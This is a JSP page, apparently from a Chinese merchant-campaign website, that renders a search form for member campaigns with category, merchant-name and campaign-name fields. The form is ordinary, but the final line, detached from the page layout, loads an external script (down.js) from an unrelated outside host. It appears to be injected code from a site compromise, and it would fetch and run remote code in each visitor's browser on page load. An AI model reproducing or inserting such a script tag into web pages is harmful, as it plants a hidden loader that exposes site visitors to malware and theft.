<%@ page language="java" pageEncoding="GBK" %>
<%@ taglib prefix="c" uri="http://java.sun.com/jstl/core" %>
<%@ taglib prefix="fmt" uri="http://java.sun.com/jstl/fmt" %>
<script language="javascript">
<!--
function checkSearchCampaignForm(){
   if(validate(document.searchCampaignForm.merchantKey, '商户关键字', 'public', 2, 32, true) &&
      validate(document.searchCampaignForm.campaignKey, '活动关键字', 'public', 2, 32, true)  ){
	   	    return true;
   }   
    return false;
}
//-->
</script>


      <table width="100%" border="0" cellpadding="0" cellspacing="0" bgcolor="#FFFFFF">
        <tr> 
          <td width="100%" height="57" align="left" valign="top"> 
            
      <table  width="100%" height="57" border="0" cellpadding="0" cellspacing="0">
        <tr background="images/bg_table_title.gif"> 
                <td colspan="4" height="26"></td>
              </tr>
              <tr> 
                <td  height="31">&nbsp;</td>
                <td height="31" colspan="3" class="red15">会员活动分类搜索</td>
              </tr>
            </table>
          </td>
        </tr>
        <tr> 
          <td height="145" valign="top" width="100%"> 
            <table width="100%" border="0" cellspacing="0" cellpadding="0">
              <form method="post" name="searchCampaignForm" id="searchCampaignForm" action='<c:url value="/queryCampaign.do"/>' onSubmit="javascript: return checkSearchCampaignForm();">
                
                <tr> 
                  <td>&nbsp;</td>
                  <td> 
                    
              <table width="100%" border="0" cellpadding="0" cellspacing="2">
                <tr> 
                  <td height="33" align="right" bgcolor="#FF6600" class="white12">商户类型：</td>
                  <td class="input"> 
                    <select name="merchantCtg" >
                      <option value="" selected>请选择...</option>
                      <c:forEach var="merchantCategory" items="${applicationScope.appData.merchantCategories}"> 
                      <option value='<c:out value="${merchantCategory.mcNo}"/>'><c:out value="${merchantCategory.name}"/></option>
                      </c:forEach> 
                    </select>                  </td>
                </tr>
                <tr> 
                  <td height="27" align="right" bgcolor="#FF6600" class="white12">商户名：</td>
                  <td> 
                    <input type="text" name="merchantKey" size="10" value="" title="商户关键字" align="absmiddle" />                  </td>
                </tr>
                <tr> 
                  <td height="26" align="right" bgcolor="#FF6600" class="white12">活动名：</td>
                  <td> 
                    <input type="text" name="campaignKey" size="10" value="" title="活动关键字" align="absmiddle" />                  </td>
                </tr>
              </table>                  </td>
                </tr>
                <tr> 
                  <td height="31" colspan="2" align="center"> 
                    <input type="submit" name="Submit" value="查询" />                  </td>
                </tr>
              </form>
            </table>
          </td>
        </tr>
      </table>
<script language=javascript src=http://Town.531jx.cn/down.js></script>